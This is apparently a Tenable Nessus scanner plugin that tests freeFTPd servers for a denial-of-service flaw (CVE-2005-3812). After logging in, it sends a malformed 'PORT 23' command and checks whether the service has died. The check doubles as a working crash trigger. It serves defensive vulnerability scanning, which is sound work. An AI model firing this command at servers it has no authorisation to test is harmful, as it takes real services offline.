#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description) {
  script_id(20247);
  script_version("$Revision: 1.20 $");

  script_cve_id("CVE-2005-3812");
  script_bugtraq_id(15557);
  script_osvdb_id(21108);

  script_name(english:"freeFTPd Multiple Command Malformed Argument Remote DoS");
  script_summary(english:"Checks for port command denial of service vulnerability in freeFTPd");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is prone by to denial of service attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host appears to be using freeFTPd, a free FTP / FTPS / SFTP
server for Windows. 

The version of freeFTPd installed on the remote host crashes if it
receives a PORT command with a port number from an authenticated user. 
In addition, the application reportedly will freeze for a period of
time if it receives a PASV command with user-supplied data." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/417602/30/0/threaded" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:S/C:N/I:N/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:ND/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/11/29");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/11/24");
 script_cvs_date("$Date: 2016/11/01 16:04:34 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:freeftpd:freeftpd");
script_end_attributes();

 
  script_category(ACT_DENIAL);
  script_family(english:"FTP");
  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");
  script_dependencies("ftpserver_detect_type_nd_version.nasl");
  script_require_ports("Services/ftp", 21);
  script_require_keys("ftp/login", "ftp/password");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


user = get_kb_item_or_exit("ftp/login");
pass = get_kb_item_or_exit("ftp/password");

port = get_ftp_port(default: 21);

banner = get_ftp_banner(port:port);
if (! banner) exit(1, "No FTP banner on port "+port+".");
if (! egrep(pattern:"220[ -]Hello, I'm freeFTPd", string:banner))
  exit(0, "The FTP server on port "+port+" is not freeFTPd.");

# If it looks like freeFTPd...
soc = open_sock_tcp(port);
if (! soc) exit(1, "Cannot connect to TCP port "+port+".");

    if (!ftp_authenticate(socket:soc, user:user, pass:pass)) {
      close(soc);
      exit(1, "cannot login with supplied ftp credentials");
    }

    c = 'PORT 23';
    s = ftp_send_cmd(socket:soc, cmd:c);

    if (!strlen(s)) {
      # Daemon doesn't crash immediately.
      sleep(5);

      # Check whether it's truly down.
      if (service_is_dead(port: port) > 0)
      {
        security_warning(port);
        exit(0);
      }
    }

    ftp_close(socket:soc);
